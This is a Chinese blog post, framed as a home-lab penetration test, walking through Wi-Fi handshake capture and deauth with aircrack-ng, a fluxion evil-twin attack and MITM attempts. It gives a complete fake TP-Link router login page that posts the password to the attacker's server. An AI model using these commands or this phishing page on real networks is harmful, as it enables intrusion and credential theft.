@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog,hacker,pentesting">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>一次模拟家庭网络渗透 · thr0cyte&#39;s bolg</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon2.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >thr0cyte&#39;s blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">一次模拟家庭网络渗透</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>thr0cyte's blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            一次模拟家庭网络渗透
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "无线渗透">无线渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "内网渗透">内网渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "社工">社工</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wifi">wifi</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.1k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>国庆无聊，自己搭环境完成了一次家庭网络漫游，记录一下。<br><br><br>ps：我把这次无线渗透的整个过程抓包取证下来做成了一个应急响应的练习，已经发到了github上，需要答案的联系我。<br><br><br>靶机环境：tp-link路由器，安卓手机，电脑主机<br>攻击环境：tp-link无线网卡，kali主机,win7主机<br><br><br>既然是家庭网络，最好进入的当然是wifi，锁定信号后开始渗透<br>（无线渗透过程我没截图，直接口述吧）<br>插上无线网卡，airmon-ng start wlan0进入moniter模式<br>airodump-ng wlan0mon开始侦听无线网络<br>选择针对的网络侦听airodump-ng wlan0mon –bssid … -c 6 -w 1.cap<br>再开一个窗口 aireplay-ng -0 2 -a … -c … wlan0mon进行两次deauth断网重连攻击<br>侦听窗口显示抓到握手包<br>aircrack-ng -a2 -b … -w 字典.txt 1.cap<br>开始暴力破解密码..<br>看来密码很复杂，password not find<br><br><br>换个方法，用社工钓鱼,把github上的fluxion安上<br>./fluxion.sh<br>进入选择chinese，选择双面恶魔攻击，选择好目标，选择hostapd验证方式，然后生成证书，接着把握手包路径指定到1.cap，开始双面恶魔攻击<br>界面弹出6个bash，十分酷炫<br>（人格切换到受害者）<br>手机突然上不了网了，无线列表一看，重新连接上自家的wifi，浏览器弹出，界面显示无线网络异常，输入无线密码来修复网络<br>输入psk后网络恢复正常。<br>（人格切换攻击者）<br>已经拿到了psk并且验证成功，这样就进入了私人家庭网络。<br><br><br>开始内网渗透<br>192.168.1.1进入路由器管理界面，弱密码测试失败<br>那就用MITM诱骗密码：<br>首先要伪造好路由器管理界面，把密码post到自己的服务器上，利用SET社工包吧！<br>选择web攻击，选择Credential Harvester Attack Method<br>克隆192.168.1.1路由器界面后测试了一下，克隆失败<br><img src="/images/jt3.PNG" alt="">问了下道友，明白了，原来还要手动爬取css和js<br>开始对路由器界面前端审计…（中间换了ctrl s，SET克隆，weeman克隆都不能克隆完全）发现这个页面不是一般的庞大，手动爬取估计忙到晚上去了！<br><br><br>就想了另外一个思路：<br>用mimtf对受害者的http请求凌空注入js location跳转到192.168.1.1，然后渲染一下页面，直接嗅探应该可行。<br>一顿操作猛如虎，结果嗅探到的是加密后的密码，而且是从来没见过的加密方式..<br>好吧！搞来搞去还是得自己动手写钓鱼页面。<br>页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;TL-WR842N&lt;/title&gt;</span><br><span class="line">	&lt;link rel=&quot;Shortcut Icon&quot; href=&quot;http://192.168.1.1/images/icon.png&quot; type=&quot;image/jpeg&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; href=&quot;TL-WR842N_files/class.css&quot;&gt;</span><br><span class="line">	&lt;script type=&quot;text/javascript&quot; src=&quot;TL-WR842N_files/class.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;TL-WR842N_files/jquery-1.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/model.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/DM.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/str.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/error.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/Quary.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/ajax.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;link href=&quot;TL-WR842N_files/menu.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;link href=&quot;TL-WR842N_files/DataGrid.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;script src=&quot;TL-WR842N_files/verify.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/macFactory.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/DataGrid.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;TL-WR842N_files/menu.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;/head&gt;</span><br><span class="line">&lt;body style=&quot;background-color: rgb(72, 207, 174); font-size: 12px; height: 100%;&quot;&gt;</span><br><span class="line">	&lt;div style=&quot;top: -9999px; visibility: hidden; display: none;&quot; id=&quot;Error&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div style=&quot;top: -9999px; visibility: hidden; display: none;&quot; id=&quot;Confirm&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div style=&quot;display: none;&quot; id=&quot;Con&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div style=&quot;display: none;&quot; id=&quot;Help&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div style=&quot;display: none;&quot; id=&quot;Cover&quot;&gt;&lt;/div&gt;</span><br><span class="line">	&lt;div style=&quot;display: block;&quot; id=&quot;Login&quot;&gt;&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">	div.logo&#123;</span><br><span class="line">		width:980px;</span><br><span class="line">		height:16px;</span><br><span class="line">		background:url(http://192.168.1.1/../images/logo.png) no-repeat 0 40px;</span><br><span class="line">		margin:0px auto;</span><br><span class="line">		padding-top:40px;</span><br><span class="line">	&#125;</span><br><span class="line">	div.lgCon&#123;</span><br><span class="line">		width:980px;</span><br><span class="line">		margin:0px auto;</span><br><span class="line">		position:relative;</span><br><span class="line">	&#125;</span><br><span class="line">	div.lgCon ul&#123;</span><br><span class="line">		width:345px;</span><br><span class="line">		margin:0px auto;</span><br><span class="line">		position:relative;</span><br><span class="line">		list-style:none;</span><br><span class="line">	&#125;</span><br><span class="line">	#lgPwdNoteUl&#123;</span><br><span class="line">		top:0px;</span><br><span class="line">		right:23px;</span><br><span class="line">		position:absolute;</span><br><span class="line">		list-style:none;</span><br><span class="line">		visibility:hidden;</span><br><span class="line">	&#125;</span><br><span class="line">	#btnfunc&#123;</span><br><span class="line">		top:1px;</span><br><span class="line">		left:297px;</span><br><span class="line">		position:absolute;</span><br><span class="line">		z-index:0;</span><br><span class="line">	&#125;</span><br><span class="line">	input.lgBtnR&#123;</span><br><span class="line">		height:38px;</span><br><span class="line">		width:38px;</span><br><span class="line">		padding:0;</span><br><span class="line">		border:0 none;</span><br><span class="line">		cursor:pointer;</span><br><span class="line">		background:url(http://192.168.1.1/../images/wzd.png) no-repeat -105px -193px;</span><br><span class="line">	&#125;</span><br><span class="line">	#abcabc&#123;</span><br><span class="line">		height:38px;</span><br><span class="line">		width:38px;</span><br><span class="line">		padding:0;</span><br><span class="line">		border:0 none;</span><br><span class="line">		cursor:pointer;</span><br><span class="line">		background:url(http://192.168.1.1/../images/wzd.png) no-repeat -105px -193px;</span><br><span class="line">	&#125;</span><br><span class="line">	li.loginHelp&#123;</span><br><span class="line">		margin-top:15px;</span><br><span class="line">		padding-left:7px;		</span><br><span class="line">		text-indent:7px;</span><br><span class="line">	&#125;</span><br><span class="line">	i.loginHelp&#123;</span><br><span class="line">		width:13px;</span><br><span class="line">		height:13px;</span><br><span class="line">		display:inline-block;</span><br><span class="line">		vertical-align:middle;</span><br><span class="line">		cursor:pointer;</span><br><span class="line">		background:url(http://192.168.1.1/../images/wzd.png) no-repeat -262px -247px;</span><br><span class="line">	&#125;</span><br><span class="line">	span.loginHelp&#123;</span><br><span class="line">		color:#ffffff;</span><br><span class="line">		*margin-left:5px;</span><br><span class="line">		vertical-align:middle;</span><br><span class="line">		cursor:pointer;</span><br><span class="line">	&#125;</span><br><span class="line">	#loginFeg&#123;</span><br><span class="line">		width:340px;</span><br><span class="line">		height:50px;</span><br><span class="line">		color:white;</span><br><span class="line">		border-radius:3px;</span><br><span class="line">		margin-top:10px;</span><br><span class="line">		position:relative;</span><br><span class="line">		background:#FB6E52;</span><br><span class="line">		visibility:hidden;</span><br><span class="line">	&#125;</span><br><span class="line">	#loginFeg p&#123;</span><br><span class="line">		padding:10px;</span><br><span class="line">		line-height:16px;</span><br><span class="line">		word-wrap:break-word;</span><br><span class="line">		word-break:break-all;</span><br><span class="line">		text-indent:0px;</span><br><span class="line">	&#125;</span><br><span class="line">	#loginFeg i&#123;</span><br><span class="line">		height:0px;</span><br><span class="line">		line-height:0px;</span><br><span class="line">		width:0px;</span><br><span class="line">		top:-3px;</span><br><span class="line">		left:40px;</span><br><span class="line">		position:absolute;</span><br><span class="line">		border-style:solid;</span><br><span class="line">		border-color:#48CFAE #48CFAE #FB6E52 #48CFAE;</span><br><span class="line">		border-width:0px 4px 3px 4px;</span><br><span class="line">	&#125;</span><br><span class="line">	#lgPwdNote&#123;</span><br><span class="line">		font-size:0px;</span><br><span class="line">		position:relative;</span><br><span class="line">		z-index:1;</span><br><span class="line">	&#125;</span><br><span class="line">	#lgPwdNote div.noteCon&#123;</span><br><span class="line">		font-size:12px;</span><br><span class="line">	&#125;</span><br><span class="line">	#loginError&#123;</span><br><span class="line">		width:auto;</span><br><span class="line">		margin-top:0px;</span><br><span class="line">		padding:5px 0px 0px 7px;</span><br><span class="line">		line-height:16px;</span><br><span class="line">	&#125;</span><br><span class="line">	li.note i.arrowLgL&#123;</span><br><span class="line">		line-height:0px;</span><br><span class="line">		border-style:solid;</span><br><span class="line">		border-width:4px 3px 4px 0px;</span><br><span class="line">		border-color:#48CFAE #FB6E52 #48CFAE #48CFAE;</span><br><span class="line">		vertical-align:middle;</span><br><span class="line">		display:inline-block;</span><br><span class="line">		*display:inline;</span><br><span class="line">		*zoom:1;</span><br><span class="line">	&#125;</span><br><span class="line">	#Cover p&#123;</span><br><span class="line">		padding:0px;</span><br><span class="line">		text-align:center;</span><br><span class="line">		color:#FFFFFF;</span><br><span class="line">		font-weight:bold;</span><br><span class="line">		font-size:16px;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;logo&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div style=&quot;margin-top: 148px;&quot; class=&quot;lgCon&quot;&gt;</span><br><span class="line">	&lt;ul&gt;</span><br><span class="line">		&lt;li&gt;</span><br><span class="line">			&lt;ul class=&quot;inputUl&quot;&gt;</span><br><span class="line">				&lt;li class=&quot;inputLi&quot;&gt;</span><br><span class="line">					&lt;label for=&quot;lgPwd&quot;&gt;登录密码&lt;/label&gt;</span><br><span class="line">					&lt;form action=&quot;http://192.168.1.103/recieve.php&quot; method=&quot;post&quot; style=&quot;margin-left: 65px;margin-top: -40px;&quot;&gt;</span><br><span class="line">						&lt;input id=&quot;lgPwd&quot; maxlength=&quot;15&quot; type=&quot;password&quot;&gt;</span><br><span class="line">						&lt;input type=&quot;submit&quot; id=&quot;abcabc&quot; class=&quot;lgBtnR&quot; value=&quot;      &quot; style= &quot;background-color:transparent;border:0;margin-left: 220px;margin-top: -40px;font-size:18px;&quot;&gt;</span><br><span class="line">						</span><br><span class="line">					&lt;/form&gt;</span><br><span class="line">					&lt;i class=&quot;tip&quot;&gt;&lt;/i&gt;</span><br><span class="line">				&lt;/li&gt;</span><br><span class="line">			&lt;/ul&gt;</span><br><span class="line">		&lt;/li&gt;</span><br><span class="line">		&lt;li class=&quot;loginHelp&quot;&gt;</span><br><span class="line">			&lt;i class=&quot;loginHelp&quot;&gt;&lt;/i&gt;</span><br><span class="line">			&lt;span class=&quot;loginHelp&quot;&gt;忘记密码&lt;/span&gt;</span><br><span class="line">			&lt;div id=&quot;loginFeg&quot;&gt;</span><br><span class="line">				&lt;i class=&quot;&quot;&gt;&lt;/i&gt;</span><br><span class="line">				&lt;p class=&quot;&quot;&gt;如忘记密码，请恢复出厂设置。恢复方法：在设备通电的情况下，按住“Reset按键”直到所有指示灯同时亮起后松开。&lt;/p&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/li&gt;</span><br><span class="line">		&lt;li id=&quot;btnfunc&quot;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;/li&gt;</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">	&lt;ul id=&quot;lgPwdNoteUl&quot;&gt;</span><br><span class="line">		&lt;li id=&quot;lgPwdNote&quot; class=&quot;note&quot;&gt;</span><br><span class="line">			&lt;i class=&quot;arrowLgL&quot;&gt;&lt;/i&gt;</span><br><span class="line">			&lt;div class=&quot;noteCon&quot;&gt;</span><br><span class="line">				&lt;p style=&quot;line-height: 16px;&quot; id=&quot;loginError&quot;&gt;&lt;/p&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">		&lt;/li&gt;</span><br><span class="line">	&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">	&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">		pageOnload();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;网络异常,请重启路由器&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
